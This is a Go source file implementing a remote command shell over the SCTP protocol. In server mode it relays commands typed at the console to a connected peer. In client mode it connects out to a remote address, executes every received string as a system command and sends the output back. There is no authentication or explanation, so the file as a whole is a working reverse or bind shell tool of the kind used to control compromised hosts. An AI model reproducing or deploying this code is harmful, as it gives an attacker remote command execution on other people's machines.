package main

import (
	"bufio"
	"flag"
	"fmt"
	"github.com/ishidawataru/sctp"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main()  {
	var ipaddr = flag.String("a","127.0.0.1","addr if client a is remote addr ;if server a is bind addr")
	var rport = flag.Int("rp",12345,"remote port")
	var lport = flag.Int("lp",12346,"local port")
	var server = flag.Bool("s",false,"server mode on/off")


	flag.Parse()

	var ips []net.IPAddr
	ip,err := net.ResolveIPAddr("ip",*ipaddr)
	if err != nil{
		panic(err)
	}
	ips = append(ips,*ip)
	addr := &sctp.SCTPAddr{
		IPAddrs: ips,
		Port: *lport,
	}

	if *server{
		link,err := sctp.ListenSCTP("sctp",addr)
		if err != nil{
			panic(err)
		}
		fmt.Printf("[*] Listening on %s ...\n",link.Addr())
		conn,err := link.Accept()
		if err != nil{
			panic(err)
		}
		fmt.Printf("[*] retrive connection from %s ...\n",conn.RemoteAddr())

		go serverside(conn)
		scanner := bufio.NewReader(os.Stdin)
		for{

			command,_,err := scanner.ReadLine()
			fmt.Print("[*] output: \n")
			if err != nil{
				panic(err)
			}
			_,err = conn.Write(command)
		}
	}else {
		laddr := &sctp.SCTPAddr{
			Port: *lport,
		}
		addr.Port = *rport
		conn,err := sctp.DialSCTP("sctp",laddr,addr)
		if err != nil{
			panic(err)
		}


		for{
			buf := make([]byte,1024)
			n,err := conn.Read(buf)
			if err != nil{
				panic(err)
			}
			command := string(buf[0:n])
			split_command := strings.Split(command," ")
			fmt.Printf(command)
			output,err := exec.Command(split_command[0],split_command[1:]...).Output()
			conn.Write(output)
		}

	}


}


func serverside(conn net.Conn) {
	for {
		buff := make([]byte,1024)
		n,err := conn.Read(buff)
		if err != nil{
			panic(err)
		}
		fmt.Println(string(buff[0:n]))
		fmt.Print("cmd>>>")
	}

}
